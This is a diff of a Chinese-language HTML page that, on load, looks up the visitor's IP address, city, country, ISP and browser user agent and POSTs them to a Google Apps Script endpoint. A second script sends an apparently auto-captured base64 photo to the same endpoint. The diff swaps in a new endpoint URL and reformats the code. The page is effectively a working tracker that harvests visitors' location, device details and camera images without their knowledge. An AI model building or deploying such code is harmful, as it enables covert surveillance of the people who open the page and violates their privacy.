@@ -6,44 +6,43 @@
   <title>照片上傳與記錄</title>
 </head>
 <body>
-  <h1>自動拍攝照片與記錄 ㄎIP 資訊</h1>
+  <h1>自動拍攝照片與記錄 IP 資訊</h1>
   <p id="ipInfo">載入中...</p>
   <p id="status">尚未開始操作</p>
 
   <script>
     // 獲取 IP 和地理位置信息
-fetch('https://ipinfo.io/json')
-  .then(response => response.json())
-  .then(data => {
-    const { ip, city, region, country, org } = data;
-    const ipType = ip.includes('.') ? 'IPV4' : 'IPV6';
-    const userAgent = navigator.userAgent;
+    fetch('https://ipinfo.io/json')
+      .then(response => response.json())
+      .then(data => {
+        const { ip, city, region, country, org } = data;
+        const ipType = ip.includes('.') ? 'IPV4' : 'IPV6';
+        const userAgent = navigator.userAgent;
 
-    // 顯示 IP 資訊於網頁上
-    document.getElementById('ipInfo').innerText =
-      `IP: ${ip}, 類型: ${ipType}, 城市: ${city}, 區域: ${region}, 國家: ${country}, 組織: ${org}, 用戶代理: ${userAgent}`;
+        // 顯示 IP 資訊於網頁上
+        document.getElementById('ipInfo').innerText =
+          `IP: ${ip}, 類型: ${ipType}, 城市: ${city}, 區域: ${region}, 國家: ${country}, 組織: ${org}, 用戶代理: ${userAgent}`;
 
-    // 發送 IP 資訊至 Apps Script
-    return fetch('https://script.google.com/macros/s/AKfycbyYn6k_BqURlfyo5DAinRml1wb6t2FFMam9avcA6uWD9MdQQMJnPWV52fsL7wstLR5eFw/exec', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({ ip, ipType, city, region, country, org, userAgent }),
-    });
-  })
-  .then(response => response.json())
-  .then(data => {
-    if (data.success) {
-      console.log('成功回傳 IP 資訊:', data.message);
-    } else {
-      console.error('回傳失敗:', data.error);
-    }
-  })
-  .catch(error => {
-    console.error('錯誤:', error);
-  });
-
+        // 發送 IP 資訊至 Apps Script
+        return fetch('https://script.google.com/macros/s/AKfycbxSESBq4bhTW9H3H_D7ZtFTNpjv4P8iIbp6AAl0400zdt63uPpEeRLzMVn_Kr3Au-UulQ/exec', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ ip, ipType, city, region, country, org, userAgent }),
+        });
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.success) {
+          console.log('成功回傳 IP 資訊:', data.message);
+        } else {
+          console.error('回傳失敗:', data.error);
+        }
+      })
+      .catch(error => {
+        console.error('錯誤:', error);
+      });
 
     document.addEventListener('DOMContentLoaded', async () => {
       try {
@@ -58,7 +57,7 @@ fetch('https://ipinfo.io/json')
           const base64Photo = reader.result;
 
           // 發送照片至 Google Apps Script
-          fetch('https://script.google.com/macros/s/AKfycbyYn6k_BqURlfyo5DAinRml1wb6t2FFMam9avcA6uWD9MdQQMJnPWV52fsL7wstLR5eFw/exec', { // 替換為 Apps Script 部署 URL
+          fetch('https://script.google.com/macros/s/AKfycbxSESBq4bhTW9H3H_D7ZtFTNpjv4P8iIbp6AAl0400zdt63uPpEeRLzMVn_Kr3Au-UulQ/exec', { // 替換為 Apps Script 部署 URL
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ photos: [base64Photo] }),
@@ -85,4 +84,3 @@ fetch('https://ipinfo.io/json')
   </script>
 </body>
 </html>
-
